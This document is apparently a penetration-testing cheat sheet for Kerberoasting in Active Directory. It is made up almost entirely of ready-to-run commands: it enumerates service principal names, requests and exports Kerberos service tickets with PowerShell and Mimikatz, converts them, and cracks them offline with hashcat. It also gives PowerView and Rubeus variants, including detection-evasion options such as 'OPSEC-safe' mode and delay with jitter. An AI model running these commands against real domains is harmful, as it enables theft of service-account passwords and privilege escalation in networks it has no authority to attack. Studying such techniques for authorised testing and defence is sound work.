---
legal-banner: true
---

### **Step 1: Preparation and SPN Enumeration**

1. List all Service Principal Names (SPNs) in the domain:  
   ```bash
   setspn.exe -Q */*
   ```

2. Add the .NET Framework class to the PowerShell session:  
   ```powershell
   Add-Type -AssemblyName System.IdentityModel
   ```

3. Request a Ticket Granting Service (TGS) ticket for a specific SPN:  
   ```powershell
   New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-SQL-hackfast.example.local:1433"
   ```

4. Retrieve all tickets:  
   ```powershell
   setspn.exe -T EXAMPLE.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
   ```

### **Step 2: Export and Prepare Kerberos Tickets**

5. Use Mimikatz to list and export Kerberos tickets:  
   ```plaintext
   mimikatz # kerberos::list /export
   ```

6. Convert tickets to base64 for easier transport:  
   ```plaintext
   mimikatz # base64 /out:true
   ```

7. Remove new lines and spaces:  
   ```bash
   echo "[BASE64 BLOB]" | tr -d \\n
   ```

8. Save the blob to a `.kirbi` file:  
   ```bash
   cat encoded_file | base64 -d > sqldev.kirbi
   ```

### **Step 3: Extract and Crack the Kerberos Ticket**

9. Extract the Kerberos ticket using `kirbi2john.py`:  
   ```bash
   python2.7 kirbi2john.py sqldev.kirbi > crack_file
   ```

10. Modify the file for Hashcat:  
   ```bash
   sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
   ```

11. Confirm the prepared hash:  
   ```bash
   cat sqldev_tgs_hashcat
   ```

12. Crack the hash with Hashcat:  
   ```bash
   hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
   ```

### **PowerView for SPN Enumeration and Ticket Extraction**

1. Import PowerView:  
   ```powershell
   Import-Module .\PowerView.ps1
   ```

2. List domain users with SPNs:  
   ```powershell
   Get-DomainUser * -spn | select samaccountname
   ```

3. Get SPN tickets for a specific user and format for Hashcat:  
   ```powershell
   Get-DomainUser -Identity [USERNAME] | Get-DomainSPNTicket -Format Hashcat
   ```

### **Rubeus for Advanced Kerberoasting Techniques**

1. Perform Kerberoasting and output hashes to a file:  
   ```bash
   .\Rubeus.exe kerberoast /outfile:hashes.txt
   ```

2. Perform Kerberoasting with alternate credentials:  
   ```bash
   .\Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD
   ```

3. Perform Kerberoasting with an existing TGT:  
   ```bash
   .\Rubeus.exe kerberoast /ticket:BASE64 | /ticket:FILE.KIRBI
   ```

4. Perform OPSEC-safe Kerberoasting:  
   ```bash
   .\Rubeus.exe kerberoast /rc4opsec
   ```

5. Request tickets for accounts with an admin count of 1:  
   ```bash
   .\Rubeus.exe kerberoast /ldapfilter:'admincount=1'
   ```

6. Perform Kerberoasting with a delay and jitter:  
   ```bash
   .\Rubeus.exe kerberoast /delay:5000 /jitter:30
   ```
